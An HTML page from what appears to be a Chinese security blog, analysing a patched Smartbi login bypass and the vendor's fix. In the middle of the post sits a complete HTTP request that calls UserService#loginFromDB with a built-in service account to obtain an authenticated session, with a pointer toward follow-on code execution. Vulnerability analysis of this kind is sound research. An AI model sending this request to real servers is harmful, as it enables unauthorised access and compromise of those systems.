@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="0x00 背景SmartBI 在 2023-06-12 日修复了一处安全漏洞：  2023-06-12 修复在某种特定情况下默认用户绕过登录漏洞。  0x01 漏洞分析这个漏洞在今年早些时候因为一些原因挖到了，大致原因是因为 Smartbi 在安装时内置了几个服务账号，通过特殊的接口可以登陆这些账号，从而获取一个登陆态的 session。 Smartbi 安装后默认无法登陆内置的 MySQL 数据">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Smartbi 内置用户登陆绕过分析">
+<meta property="og:url" content="https://4ark.me/post/Smartbi-%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90.html">
+<meta property="og:site_name" content="___">
+<meta property="og:description" content="0x00 背景SmartBI 在 2023-06-12 日修复了一处安全漏洞：  2023-06-12 修复在某种特定情况下默认用户绕过登录漏洞。  0x01 漏洞分析这个漏洞在今年早些时候因为一些原因挖到了，大致原因是因为 Smartbi 在安装时内置了几个服务账号，通过特殊的接口可以登陆这些账号，从而获取一个登陆态的 session。 Smartbi 安装后默认无法登陆内置的 MySQL 数据">
+<meta property="og:locale">
+<meta property="og:image" content="https://p.ipic.vip/2jcjpb.png">
+<meta property="og:image" content="https://p.ipic.vip/lpo2eh.png">
+<meta property="og:image" content="https://p.ipic.vip/nen7lz.png">
+<meta property="og:image" content="https://p.ipic.vip/nlvg90.png">
+<meta property="og:image" content="https://p.ipic.vip/1xp27g.png">
+<meta property="og:image" content="https://p.ipic.vip/zj07un.png">
+<meta property="og:image" content="https://p.ipic.vip/t2e767.png">
+<meta property="og:image" content="https://p.ipic.vip/u9tiqa.png">
+<meta property="og:image" content="https://p.ipic.vip/z28fua.png">
+<meta property="article:published_time" content="2023-06-17T14:46:32.000Z">
+<meta property="article:modified_time" content="2023-06-17T14:48:55.250Z">
+<meta property="article:author" content="p1g3">
+<meta property="article:tag" content="漏洞分析">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://p.ipic.vip/2jcjpb.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Smartbi 内置用户登陆绕过分析</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/post/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%B5%8B%E7%BB%98%E5%BC%95%E6%93%8E%E8%96%85%E7%BE%8A%E6%AF%9B%E8%A1%8C%E5%8A%A8.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://4ark.me/post/Smartbi-%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://4ark.me/post/Smartbi-%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90.html&text=Smartbi 内置用户登陆绕过分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://4ark.me/post/Smartbi-%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90.html&title=Smartbi 内置用户登陆绕过分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://4ark.me/post/Smartbi-%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90.html&is_video=false&description=Smartbi 内置用户登陆绕过分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Smartbi 内置用户登陆绕过分析&body=Check out this article: https://4ark.me/post/Smartbi-%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90.html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://4ark.me/post/Smartbi-%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90.html&title=Smartbi 内置用户登陆绕过分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://4ark.me/post/Smartbi-%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90.html&title=Smartbi 内置用户登陆绕过分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://4ark.me/post/Smartbi-%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90.html&title=Smartbi 内置用户登陆绕过分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://4ark.me/post/Smartbi-%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90.html&title=Smartbi 内置用户登陆绕过分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://4ark.me/post/Smartbi-%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90.html&name=Smartbi 内置用户登陆绕过分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://4ark.me/post/Smartbi-%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90.html&t=Smartbi 内置用户登陆绕过分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E8%83%8C%E6%99%AF"><span class="toc-number">1.</span> <span class="toc-text">0x00 背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">0x01 漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">0x02 补丁分析</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Smartbi 内置用户登陆绕过分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">p1g3</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-06-17T14:46:32.000Z" class="dt-published" itemprop="datePublished">2023-06-17</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>SmartBI 在 2023-06-12 日修复了一处安全漏洞：</p>
+<blockquote>
+<p>2023-06-12 修复在某种特定情况下默认用户绕过登录漏洞。</p>
+</blockquote>
+<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>这个漏洞在今年早些时候因为一些原因挖到了，大致原因是因为 <strong>Smartbi 在安装时内置了几个服务账号，通过特殊的接口可以登陆这些账号，从而获取一个登陆态的 session。</strong></p>
+<p>Smartbi 安装后默认无法登陆内置的 MySQL 数据库，需要使用<a target="_blank" rel="noopener" href="https://wiki.smartbi.com.cn/pages/viewpage.action?pageId=76678923">一些魔法</a>，登陆后查询 t_user 表可以发现除了 admin 和 public 用户外，还有几个内置账户（ public、service、system）也在表中：</p>
+<p><img src="https://p.ipic.vip/2jcjpb.png" alt="image-20230617222313479"></p>
+<p>如果你尝试直接使用这几个账号在前台登陆，会发现其实是无法登陆的：</p>
+<p><img src="https://p.ipic.vip/lpo2eh.png" alt="image-20230617224447155"></p>
+<p>这是因为正常登陆走的是 <code>SecurityServiceImpl#loginDB</code> 方法的逻辑：</p>
+<p><img src="https://p.ipic.vip/nen7lz.png" alt="image-20230617222446846"></p>
+<p>这里通过 <code>UserBO#isPasswordValidate</code> 来判断表单输入的密码是否和用户真实密码一致：</p>
+<p><img src="https://p.ipic.vip/nlvg90.png" alt="image-20230617222536650"></p>
+<p>可以看到，当用户的密码以0开头时，会先将表单密码进行 MD5 处理后再和数据库里的密码进行对比，因为没有一个字符串在经过 MD5 处理之后是 <code>0e</code>，所以无法通过常规接口登陆。 </p>
+<p>反编译搜了一圈之后，发现可以利用 <code>UserService#loginFromDB</code> 实现明文密码登陆：</p>
+<p><img src="https://p.ipic.vip/1xp27g.png" alt="image-20230617222851154"></p>
+<p>从代码中不难看出，这里从数据库取出用户密码后直接和没有经过任何处理的 password 进行比较，在登陆后通过 StateModule#setCurrentUser 给当前 session 设置了登陆态，最终实现登陆绕过。</p>
+<p>以 service 用户为例，发出如下请求即可获得包含 service 用户身份的 session：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /smartbi/vision/RMIServlet HTTP/1.1</span><br><span class="line">Host: 172.16.170.231:18080</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 68</span><br><span class="line"></span><br><span class="line">className=UserService&amp;methodName=loginFromDB&amp;params=[&quot;service&quot;,&quot;0a&quot;]</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://p.ipic.vip/zj07un.png" alt="image-20230617223246611"></p>
+<p>如果数据库中不存在此用户，则响应中的 result 为 false：</p>
+<p><img src="https://p.ipic.vip/t2e767.png" alt="image-20230617223517213"></p>
+<p>登陆了之后可以干什么呢？<strong>实际上 Smartbi 对于 RMIServlet 远程代码执行的修复方式仅仅是判断用户是否登陆，因此登陆后依然可以使用 RMIServlet 结合 JDBC 实现任意代码执行或任意文件写入。</strong></p>
+<h2 id="0x02-补丁分析"><a href="#0x02-补丁分析" class="headerlink" title="0x02 补丁分析"></a>0x02 补丁分析</h2><p>下载了 Smartbi 的<a target="_blank" rel="noopener" href="https://www.smartbi.com.cn/patchinfo">补丁</a>并对其进行解包后发现 Smartbi 对这个漏洞进行修复的方式简单粗暴，当 url 为 <code>/vision/RMIServlet</code> 并且 className 和 methoName 为 loginFromDB 时直接 Reject。</p>
+<p><img src="https://p.ipic.vip/u9tiqa.png" alt="image-20230617223906681"></p>
+<p><img src="https://p.ipic.vip/z28fua.png" alt="image-20230617224003710"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E8%83%8C%E6%99%AF"><span class="toc-number">1.</span> <span class="toc-text">0x00 背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">0x01 漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">0x02 补丁分析</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://4ark.me/post/Smartbi-%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://4ark.me/post/Smartbi-%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90.html&text=Smartbi 内置用户登陆绕过分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://4ark.me/post/Smartbi-%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90.html&title=Smartbi 内置用户登陆绕过分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://4ark.me/post/Smartbi-%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90.html&is_video=false&description=Smartbi 内置用户登陆绕过分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Smartbi 内置用户登陆绕过分析&body=Check out this article: https://4ark.me/post/Smartbi-%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90.html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://4ark.me/post/Smartbi-%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90.html&title=Smartbi 内置用户登陆绕过分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://4ark.me/post/Smartbi-%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90.html&title=Smartbi 内置用户登陆绕过分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://4ark.me/post/Smartbi-%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90.html&title=Smartbi 内置用户登陆绕过分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://4ark.me/post/Smartbi-%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90.html&title=Smartbi 内置用户登陆绕过分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://4ark.me/post/Smartbi-%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90.html&name=Smartbi 内置用户登陆绕过分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://4ark.me/post/Smartbi-%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90.html&t=Smartbi 内置用户登陆绕过分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    p1g3
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
